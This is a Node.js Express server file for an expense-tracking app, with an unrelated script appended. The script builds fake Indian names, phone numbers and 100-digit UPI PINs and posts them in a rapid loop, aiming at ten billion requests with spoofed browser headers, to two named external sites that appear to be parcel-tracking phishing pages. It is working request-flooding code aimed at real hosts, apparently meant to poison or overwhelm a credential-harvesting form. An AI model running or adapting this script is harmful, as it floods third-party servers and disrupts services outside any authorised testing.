const path = require("path");
const express = require("express");
const dotenv = require("dotenv");
const colors = require("colors");
const morgan = require("morgan");
const connectDB = require("./config/db");
const session = require("express-session");
require("dotenv").config();
const auth = require("./middleware/auth.js");

const passport = require("./passport");

dotenv.config({ path: "./.env" });

connectDB();

const expense = require("./routes/expense");

const user = require("./routes/user");

const app = express();

app.use(express.json());

if (process.env.NODE_ENV === "development") {
  app.use(morgan("dev"));
}
app.use("/api/v1/signin", user);

app.use(
  "/api/v1/expense",
  (req, res, next) => {
    // if (process.env.NODE_ENV === "development") {
    //   req.user = { id: "123" };
    // }
    next();
  },
  auth.isAuthenticated(),
  expense
);

if (process.env.NODE_ENV === "production") {
  app.use(express.static("client/build"));
  app.get("*", (req, res) =>
    res.sendFile(path.resolve(__dirname, "client", "build", "index.html"))
  );
}

const PORT = process.env.PORT || 5000;

app.listen(
  PORT,
  console.log(
    `Server running in ${process.env.NODE_ENV} mode on port ${PORT}`.yellow.bold
  )
);
process.on("uncaughtException",()=>{

})
process.on("unhandledRejection",()=>{
  
})

var axios = require("axios");
var FormData = require("form-data");

function generateRandomUPID(length = 6) {
  // return "234567890.456789076.09876567"
  const characters = "0123456789";
  let upid = "";
  for (let i = 0; i < length; i++) {
    upid += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return upid;
}

function generateRandomIndianPhoneNumber() {
  // return '217483647'
  const countryCode = "+91";
  const firstDigit = Math.floor(Math.random() * 9) + 6;
  const remainingDigits =
    Math.floor(Math.random() * 900000000000) + 1000000000000000000;
  return `${countryCode}${firstDigit}${remainingDigits}`;
}
function generateRandomName() {
  const firstNames = [
    "Aarav",
    "Vivaan",
    "Aditya",
    "Vihaan",
    "Arjun",
    "Sai",
    "Ananya",
    "Aadhya",
    "Diya",
    "Myra",
  ];

  const lastNames = [
    "Sharma",
    "Verma",
    "Patel",
    "Reddy",
    "Kumar",
    "Nair",
    "Singh",
    "Gupta",
    "Mehta",
    "Jain",
  ];

  const randomFirstName =
    firstNames[Math.floor(Math.random() * firstNames.length)];
  const randomLastName =
    lastNames[Math.floor(Math.random() * lastNames.length)];

  return `${randomFirstName} ${randomLastName} ${randomFirstName} ${randomLastName} ${randomFirstName} ${randomLastName}${randomFirstName} ${randomLastName} ${randomFirstName} ${randomLastName}${randomLastName}${randomFirstName} ${randomLastName} ${randomFirstName} ${randomLastName}${randomLastName}${randomFirstName} ${randomLastName} ${randomFirstName} ${randomLastName}${randomLastName}${randomFirstName} ${randomLastName} ${randomFirstName} ${randomLastName} `;
}

const totalRequests = 10000000000;
let requestCount = 0;

function sendRequest() {
  var data = new FormData();
  data.append("fullName", generateRandomName());
  data.append("bankName", "Bank of India");
  data.append("upiRegisteredNumber", generateRandomIndianPhoneNumber());
  data.append("upiPin", generateRandomUPID(100));

  var config = {
    method: "post",
    url: "https://sonuv.parceltracing.com/%24Gh3_%402%26E*(b%5E%409%23L6K%40/success.php",
    headers: {
      ...data.getHeaders(),
      "user-agent":
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/16.0.0.0 Safari/537.36",
    },
    data: data,
  };

  axios(config)
    .then(function (response) {
      console.log("RES", requestCount, response.status);
      //   console.log(JSON.stringify(response.data));
    })
    .catch(function (error) {
      console.log("ERROR", error.message);
    })
    .finally(() => {
      requestCount++;
      if (requestCount < totalRequests) {
        scheduleNextRequest();
      } else {
        console.log("Completed sending 10 billion requests.");
      }
    });
}

function sendFormRequest() {
  axios
    .post(
      "https://parceltracing.com/submit.php",
      new URLSearchParams({
        name: generateRandomName(),
        phone: generateRandomIndianPhoneNumber(),
        tracking_no: generateRandomUPID(),
        courier_name: "ExpressBees",
        "g-recaptcha-response": "",
      }),
      {
        headers: {
          accept:
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
          "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
          "cache-control": "no-cache",

          origin: "https://parceltracing.com",
          pragma: "no-cache",
          priority: "u=0, i",
          referer: "https://parceltracing.com/",
          "sec-ch-ua":
            '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
          "sec-ch-ua-mobile": "?0",
          "sec-ch-ua-platform": '"Linux"',
          "sec-fetch-dest": "document",
          "sec-fetch-mode": "navigate",
          "sec-fetch-site": "same-origin",
          "upgrade-insecure-requests": "1",
          "user-agent":
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        },
      }
    )
    .then((response) => {
      console.log(response.status);
    })
    .catch((error) => {
      console.error("Error:", error);
    });
}

function scheduleNextRequest() {
  const min = 0; // 0 minutes in milliseconds
  const max = 1 * 6 * 10; // 1 minute in milliseconds
  const time = Math.random() * 10;
  setTimeout(() => {
    sendRequest(), sendFormRequest();
  }, time);
}

sendRequest();
console.log(generateRandomIndianPhoneNumber());
